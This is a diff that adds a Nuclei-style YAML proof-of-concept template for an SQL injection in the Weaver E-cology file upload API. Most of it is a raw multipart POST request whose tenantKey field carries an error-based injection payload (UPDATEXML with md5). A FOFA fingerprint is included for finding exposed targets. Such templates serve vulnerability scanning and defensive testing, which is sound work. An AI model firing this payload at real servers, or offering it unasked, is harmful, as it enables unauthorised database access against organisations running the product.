@@ -1,0 +1,61 @@
+id: poc-fu5g884igqsumcnc
+info:
+  name: 泛微E cology upload存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fu5g884igqsumcnc'
+  tags: sqli,file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fu5g884igqsumcnc
+    fofa: icon_hash="-1619753057"
+http:
+- raw:
+  - 'POST /papi/file/module/upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Cookie: language=zh-cn; language=zh-cn
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+
+
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+
+    Content-Disposition: form-data; name="module"
+
+
+    sp
+
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+
+    Content-Disposition: form-data; name="tenantKey"
+
+
+    '' AND UPDATEXML(1,concat(''~'',md5(123),''~''),1)#
+
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF
+
+    Content-Disposition: form-data; name="file"; filename="test.txt"
+
+    Content-Type: text/plain
+
+
+    szgfbtojfpzadjpps
+
+    --------------------------aB9xY7pQ2rT8vM4eW3nL5jK6fH1qS0dF--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
